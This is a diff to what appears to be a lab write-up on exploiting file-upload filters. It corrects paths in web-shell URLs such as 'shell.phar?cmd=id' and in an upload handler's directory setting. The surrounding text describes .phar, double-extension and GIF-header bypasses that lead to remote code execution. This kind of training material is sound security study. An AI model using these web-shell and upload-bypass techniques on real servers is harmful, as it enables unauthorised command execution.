@@ -321,7 +321,7 @@ After forwarding the modified request, the server accepts and stores the file. T
 Finally, we navigate to the uploaded file and interact with the web shell using the `cmd` parameter:
 
 ```
-http://94.237.122.95:42771/profile/images/shell.php?cmd=id
+http://94.237.122.95:42771/profile_images/shell.php?cmd=id
 ```
 
 ![Filtered output](./.images/front-end-filter6.PNG)
@@ -381,7 +381,7 @@ Not all PHP-related extensions are supported by every web server configuration. 
 However, the `.phar` extension **is processed as PHP** by the server. Uploading the web shell with this extension successfully leads to remote code execution:
 
 ```
-http://94.237.51.160:49130/profile/images/shell.phar?cmd=id
+http://94.237.51.160:49130/profile_images/shell.phar?cmd=id
 ```
 
 ![Filtered output](./.images/phar-rce.PNG)
@@ -545,7 +545,7 @@ filename="shell.phar/.jpg"
 Visiting the uploaded file confirms remote code execution:
 
 ```
-http://94.237.120.119:48470/profile/images/shell.phar.jpg?cmd=id
+http://94.237.120.119:48470/profile_images/shell.phar.jpg?cmd=id
 ```
 
 ![Filtered output](./.images/whitelist-filter10.PNG)
@@ -790,12 +790,12 @@ GIF8
 ------WebKitFormBoundarynzyLbgp5Pm1zyjLx--
 ```
 
-![Filtered output](...images/exploitation8.PNG)
+![Filtered output](./.images/exploitation8.PNG)
 
 The uploaded file is now accessible and executable. Interacting with the web shell confirms successful code execution:
 
 ```
-http://83.136.253.5:49702/profile/images/shell.gif.phar?cmd=id
+http://83.136.253.5:49702/profile_images/shell.gif.phar?cmd=id
 ```
 
 All upload defenses were successfully bypassed, resulting in remote code execution on the target server.
@@ -934,7 +934,7 @@ Decoded source code:
 
 ```php
 <?php
-$target_dir = "./...images/";
+$target_dir = "profile_images/";
 $fileName = basename($_FILES["uploadFile"]["name"]);
 $target_file = $target_dir . $fileName;
 $contentType = $_FILES['uploadFile']['type'];
